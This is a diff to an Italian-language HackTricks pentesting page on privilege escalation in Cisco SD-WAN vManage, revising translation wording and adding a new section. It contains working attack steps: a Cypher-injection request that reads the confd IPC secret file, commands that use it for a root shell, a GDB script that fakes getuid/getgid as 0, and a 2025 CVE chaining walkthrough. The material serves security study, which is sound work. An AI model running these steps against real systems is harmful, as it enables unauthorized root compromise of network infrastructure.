@@ -2,19 +2,19 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Path 1
+## Percorso 1
 
 (Esempio da [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))
 
-Dopo aver esaminato un po' di [documentazione](http://66.218.245.39/doc/html/rn03re18.html) relativa a `confd` e ai diversi binari (accessibili con un account sul sito Cisco), abbiamo scoperto che per autenticare il socket IPC, utilizza un segreto situato in `/etc/confd/confd_ipc_secret`:
+Dopo aver esaminato un po' la [documentazione](http://66.218.245.39/doc/html/rn03re18.html) relativa a `confd` e ai diversi binari (accessibili con un account sul sito Cisco), abbiamo scoperto che per autenticare la socket IPC utilizza un segreto presente in `/etc/confd/confd_ipc_secret`:
 ```
 vmanage:~$ ls -al /etc/confd/confd_ipc_secret
 
 -rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
 ```
-Ricordi la nostra istanza Neo4j? Sta funzionando con i privilegi dell'utente `vmanage`, permettendoci così di recuperare il file utilizzando la vulnerabilità precedente:
+Ricordi la nostra istanza Neo4j? È in esecuzione con i privilegi dell'utente `vmanage`, permettendoci così di recuperare il file sfruttando la vulnerabilità precedente:
 ```
-GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1
+GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1
 
 Host: vmanage-XXXXXX.viptela.net
 
@@ -24,7 +24,7 @@ Host: vmanage-XXXXXX.viptela.net
 
 "data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
 ```
-Il programma `confd_cli` non supporta gli argomenti della riga di comando, ma chiama `/usr/bin/confd_cli_user` con argomenti. Quindi, potremmo chiamare direttamente `/usr/bin/confd_cli_user` con il nostro set di argomenti. Tuttavia, non è leggibile con i nostri privilegi attuali, quindi dobbiamo recuperarlo dal rootfs e copiarlo usando scp, leggere l'aiuto e usarlo per ottenere la shell:
+Il programma `confd_cli` non supporta argomenti da riga di comando ma invoca `/usr/bin/confd_cli_user` con argomenti. Quindi potremmo chiamare direttamente `/usr/bin/confd_cli_user` con il nostro insieme di argomenti. Tuttavia non è leggibile con i nostri privilegi attuali, quindi dobbiamo recuperarlo dal rootfs e copiarlo usando scp, leggere l'help e usarlo per ottenere la shell:
 ```
 vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret
 
@@ -42,14 +42,17 @@ vManage:~# id
 
 uid=0(root) gid=0(root) groups=0(root)
 ```
-## Path 2
+## Percorso 2
 
 (Esempio da [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))
 
-Il blog¹ del team synacktiv ha descritto un modo elegante per ottenere una shell root, ma il caveat è che richiede di ottenere una copia di `/usr/bin/confd_cli_user` che è leggibile solo da root. Ho trovato un altro modo per elevare i privilegi a root senza tale complicazione.
+Il blog¹ del team synacktiv ha descritto un modo elegante per ottenere una root shell, ma la limitazione è che richiede ottenere una copia di `/usr/bin/confd_cli_user` che è leggibile solo da root. Ho trovato un altro modo per ottenere i privilegi di root senza tale seccatura.
 
-Quando ho smontato il binario `/usr/bin/confd_cli`, ho osservato quanto segue:
-```
+Quando ho disassemblato il binario `/usr/bin/confd_cli`, ho osservato quanto segue:
+
+<details>
+<summary>Objdump che mostra la raccolta di UID/GID</summary>
+```asm
 vmanage:~$ objdump -d /usr/bin/confd_cli
 … snipped …
 40165c: 48 89 c3              mov    %rax,%rbx
@@ -77,20 +80,22 @@ vmanage:~$ objdump -d /usr/bin/confd_cli
 4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
 … snipped …
 ```
-Quando eseguo "ps aux", ho osservato quanto segue (_nota -g 100 -u 107_)
+</details>
+
+Quando eseguo “ps aux”, ho osservato quanto segue (_nota -g 100 -u 107_)
 ```
 vmanage:~$ ps aux
 … snipped …
 root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
 … snipped …
 ```
-Ho ipotizzato che il programma “confd_cli” passi l'ID utente e l'ID gruppo raccolti dall'utente connesso all'applicazione “cmdptywrapper”.
+Ho ipotizzato che il programma “confd_cli” passi l'ID utente e l'ID gruppo raccolti dall'utente loggato all'applicazione “cmdptywrapper”.
 
-Il mio primo tentativo è stato eseguire direttamente “cmdptywrapper” fornendogli `-g 0 -u 0`, ma ha fallito. Sembra che un file descriptor (-i 1015) sia stato creato lungo il percorso e non riesco a falsificarlo.
+Il mio primo tentativo è stato eseguire direttamente “cmdptywrapper” fornendogli `-g 0 -u 0`, ma è fallito. Sembra che un file descriptor (-i 1015) sia stato creato da qualche parte lungo il processo e non riesco a falsificarlo.
 
-Come menzionato nel blog di synacktiv (ultimo esempio), il programma `confd_cli` non supporta argomenti da riga di comando, ma posso influenzarlo con un debugger e fortunatamente GDB è incluso nel sistema.
+Come menzionato in synacktiv’s blog(last example), il programma `confd_cli` non supporta argomenti da linea di comando, ma posso influenzarlo con un debugger e fortunatamente GDB è incluso nel sistema.
 
-Ho creato uno script GDB in cui ho forzato l'API `getuid` e `getgid` a restituire 0. Poiché ho già il privilegio “vmanage” attraverso la deserializzazione RCE, ho il permesso di leggere direttamente il file `/etc/confd/confd_ipc_secret`.
+Ho creato uno script GDB dove ho forzato le API `getuid` e `getgid` a ritornare 0. Dato che ho già il privilegio “vmanage” tramite la RCE di deserializzazione, ho il permesso di leggere direttamente `/etc/confd/confd_ipc_secret`.
 
 root.gdb:
 ```
@@ -110,8 +115,11 @@ root
 end
 run
 ```
-Uscita della console:
-```
+Output della console:
+
+<details>
+<summary>Output della console</summary>
+```text
 vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
 GNU gdb (GDB) 8.0.1
 Copyright (C) 2017 Free Software Foundation, Inc.
@@ -144,4 +152,25 @@ root
 uid=0(root) gid=0(root) groups=0(root)
 bash-4.4#
 ```
+</details>
+
+## Path 3 (2025 CLI input validation bug)
+
+Cisco ha rinominato vManage in *Catalyst SD-WAN Manager*, ma la CLI sottostante continua a girare sulla stessa macchina. Un advisory del 2025 (CVE-2025-20122) descrive una validazione insufficiente dell'input nella CLI che permette a **qualsiasi utente locale autenticato** di ottenere root inviando una richiesta appositamente costruita al servizio CLI del manager. Combina qualsiasi low-priv foothold (e.g., la Neo4j deserialization from Path1, or a cron/backup user shell) con questa falla per salire a root senza copiare `confd_cli_user` o collegare GDB:
+
+1. Usa la tua shell low-priv per individuare l'endpoint IPC della CLI (tipicamente il listener `cmdptywrapper` mostrato sulla porta 4565 in Path2).
+2. Costruisci una richiesta CLI che falsifichi i campi UID/GID a 0. Il bug di validazione non impone l'UID del chiamante originale, quindi il wrapper avvia un PTY con privilegi root.
+3. Inoltra qualsiasi sequenza di comandi (`vshell; id`) attraverso la richiesta falsificata per ottenere una shell root.
+
+> La superficie d'exploit è local-only; è ancora necessario remote code execution per ottenere la shell iniziale, ma una volta dentro la macchina lo sfruttamento è un singolo messaggio IPC invece di una debugger-based UID patch.
+
+## Other recent vManage/Catalyst SD-WAN Manager vulns to chain
+
+* **Authenticated UI XSS (CVE-2024-20475)** – Inietta JavaScript in campi specifici dell'interfaccia; il furto di una sessione admin ti offre un percorso browser-driven verso `vshell` → local shell → Path3 per ottenere root.
+
+## Riferimenti
+
+- [Cisco Catalyst SD-WAN Manager Privilege Escalation Vulnerability (CVE-2025-20122)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-priviesc-WCk7bmmt.html)
+- [Cisco Catalyst SD-WAN Manager Cross-Site Scripting Vulnerability (CVE-2024-20475)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-xss-zQ4KPvYd.html)
+
 {{#include ../../banners/hacktricks-training.md}}
